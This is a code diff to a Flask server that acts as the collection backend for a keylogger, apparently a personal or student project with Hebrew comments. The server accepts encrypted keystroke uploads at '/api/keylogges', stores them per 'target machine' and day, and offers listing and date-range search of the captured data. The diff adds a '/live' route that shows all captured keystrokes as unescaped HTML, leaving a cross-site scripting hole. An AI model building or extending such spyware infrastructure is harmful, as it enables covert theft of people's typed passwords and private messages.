@@ -5,7 +5,7 @@ from Enkryptor import Encryptor
 a = Encryptor()
 app = Flask(__name__)
 app.last_content = None
-
+text = ''
 
 
 # DATA_FOLDER יכיל את הנתיב המלא לתיקייה הראשית
@@ -22,6 +22,7 @@ def main():
 
 @app.route('/api/keylogges', methods=['POST'])
 def upload():
+    global text
     # קבלת JSON
     encrypted_data = request.get_json(silent=True)
     encrypted_data = json.loads(encrypted_data)
@@ -51,6 +52,8 @@ def upload():
     # קובץ יומי: day.txt
     file_path = os.path.join(machine_folder, f"{day}.txt")
     content = json.dumps({'time':now, 'data':content})
+    if content:
+        text += content
     # כתיבת הנתונים לקובץ
     with open(file_path, "a", encoding="utf-8") as f:  
         f.write(content)
@@ -79,6 +82,11 @@ def get_target_machines_list():
     return json.dumps(machines)
 
 from flask import jsonify
+
+@app.route('/live')
+def get_live():
+    global text 
+    return f"<h1>{text}</h1>"
 
 @app.route("/data/<machine>/years")
 def get_years_list(machine):
@@ -208,13 +216,19 @@ def delete_month(machine, year, month):
 
 DATA_ROOT = "data" 
 
+
+
+
+
+DATA_ROOT = r"C:\Users\Yosef\keyLogger\data"  # הנתיב האמיתי למידע
+
 @app.route("/api/search/<start>/<end>", methods=["GET"])
 def collect_data(start, end):
     try:
-        start_dt = datetime.fromisoformat(start)  # לדוגמה: 2024-01-01T00:00:00
+        start_dt = datetime.fromisoformat(start)
         end_dt = datetime.fromisoformat(end)
     except ValueError:
-        return jsonify({"error": "Invalid date format. Use ISO format like 2024-01-01T00:00:00"}), 400
+        return jsonify({"error": "Invalid date format. Use ISO format like 2025-09-01T00:00:00"}), 400
 
     if not os.path.isdir(DATA_ROOT):
         return jsonify({"error": f"Root path not found: {DATA_ROOT}"}), 404
@@ -232,18 +246,19 @@ def collect_data(start, end):
                 continue
 
             for month in os.listdir(year_path):
-                month_folder = os.path.join(year_path, month)
-                if not os.path.isdir(month_folder):
+                month_path = os.path.join(year_path, month)
+                if not os.path.isdir(month_path):
                     continue
 
-                for day_file in os.listdir(month_folder):
-                    day_path = os.path.join(month_folder, day_file)
+                for day_file in os.listdir(month_path):
+                    day_path = os.path.join(month_path, day_file)
                     if not os.path.isfile(day_path):
                         continue
 
                     try:
-                        file_date = datetime.strptime(day_file, "%Y-%m-%d")
-                    except:
+                        day_num = day_file.split(".")[0]  # "03" מתוך "03.txt"
+                        file_date = datetime(int(year), int(month), int(day_num))
+                    except Exception:
                         continue
 
                     with open(day_path, encoding="utf-8") as f:
@@ -261,10 +276,12 @@ def collect_data(start, end):
                                         "datetime": dt.isoformat(),
                                         "content": content.strip()
                                     })
-                            except:
-                                pass
-    return jsonify(result)                            
-    return jsonify(sorted(result, key=lambda x: x["datetime"]),'aaaaaaa')
+                            except Exception as e:
+                                print("Error parsing line:", line, e)
+
+    return jsonify(result)
+
+
 
 from collections import Counter
 import re
